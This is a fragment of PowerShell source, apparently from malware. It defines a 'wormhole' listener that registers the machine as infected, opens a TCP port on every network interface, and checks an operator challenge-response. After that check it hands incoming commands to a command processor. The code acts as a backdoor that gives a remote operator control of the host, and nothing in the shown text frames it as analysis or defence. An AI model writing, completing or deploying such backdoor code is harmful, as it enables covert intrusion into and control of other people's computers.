134: function Start-WormholeListener {
135:     param(
136:         [int]$Port = 8787,
137:         [int]$Timeout = 300
138:     )
139:     
140:     if ($script:WormholeActive) {
141:         Write-GhostLog "Wormhole already active"
142:         return
143:     }
144:     
145:     $script:WormholeActive = $true
146:     Write-GhostLog "Wormhole listener starting on port $Port"
147:     
148:     $hostId = Get-HostIdentifier
149:     if (Test-AlreadyInfected -HostId $hostId) {
150:         Write-GhostLog "This host already registered - skipping reinfection"
151:     }
152:     else {
153:         Register-Infection -HostId $hostId
154:     }
155:     
156:     try {
157:         $listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $Port)
158:         $listener.Start()
159:         
160:         $startTime = Get-Date
161:         
162:         while ($script:WormholeActive) {
163:             if (((Get-Date) - $startTime).TotalSeconds -gt $Timeout) {
164:                 Write-GhostLog "Wormhole timeout reached"
165:                 break
166:             }
167:             
168:             if ($listener.Pending()) {
169:                 $client = $listener.AcceptTcpClient()
170:                 $stream = $client.GetStream()
171:                 $reader = New-Object System.IO.StreamReader($stream)
172:                 $writer = New-Object System.IO.StreamWriter($stream)
173:                 
174:                 try {
175:                     $challenge = [guid]::NewGuid().ToString()
176:                     $writer.WriteLine("CHALLENGE:$challenge")
177:                     $writer.Flush()
178:                     
179:                     $response = $reader.ReadLine()
180:                     
181:                     if (Test-OperatorHandshake -Challenge $challenge -Response $response) {
182:                         $writer.WriteLine("ACK")
183:                         $writer.Flush()
184:                         
185:                         $command = $reader.ReadLine()
186:                         Process-WormholeCommand -Command $command -Writer $writer
187:                     }
188:                     else {
189:                         $writer.WriteLine("REJECT")
190:                         Write-GhostLog "Rejected unauthorized connection"
191:                     }
192:                 }
193:                 finally {
194:                     $client.Close()
195:                 }
196:             }
197:             
198:             Start-Sleep -Milliseconds 100
199:         }
200:     }
201:     catch {
202:         Write-GhostLog "Wormhole error: $_"
203:     }
204:     finally {
205:         if ($listener) { $listener.Stop() }
206:         $script:WormholeActive = $false
207:         Write-GhostLog "Wormhole listener stopped"
208:     }
209: }
